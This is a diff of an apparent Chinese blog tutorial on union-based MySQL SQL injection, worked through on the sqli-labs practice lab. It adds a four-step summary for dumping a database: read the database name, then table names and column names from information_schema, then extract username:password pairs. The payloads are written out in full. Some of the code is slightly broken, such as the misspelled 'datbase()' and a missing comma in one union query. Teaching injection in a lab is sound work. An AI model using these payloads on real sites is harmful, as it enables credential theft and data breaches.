@@ -6,10 +6,9 @@ category: websec
 ---
 基于 MYSQL的 注入漏洞
 <!-- more -->
-
+# 有回显的注入
 对于有回显的注入漏洞，我们可以通过联合查询，获取数据库数据,以 sqli-labs 第一关的实验为例子
-
-# ![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557843049567-dd99a231-caaf-47e3-828a-4f6c94170898.png#align=left&display=inline&height=303&name=image.png&originHeight=606&originWidth=2288&size=474017&status=done&width=1144)
+![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557843049567-dd99a231-caaf-47e3-828a-4f6c94170898.png#align=left&display=inline&height=303&name=image.png&originHeight=606&originWidth=2288&size=474017&status=done&width=1144)
 **0x01 通过错误显示，我们可以进行单引号的测试（%23为#是 mysql 里面注释符号）**
 ```
 // 真假条件测试
@@ -75,4 +74,25 @@ union select 1,2,(select group_concat(column_name) from information_schema.colum
 union select 1,2 (select group_concat(username,":",password) from users) # 
 ```
 
+# SQL 真假盲注
+
+
+# 总结
+拖库4步骤：
+## 1. 获取当前数据库名
+```sql
+select datbase();
+```
+## 2. 获取表名
+```sql
+select group_concat(table_name) from information_schema.tables where table_schema=<database_name>
+```
+## 3. 获取列名
+```sql
+select group_concat(column_name) from information_schema.columns where table_name="<table_name>"
+```
+## 4. 获取数据
+```sql
+select group_concat(username,":",password) from users
+```
 
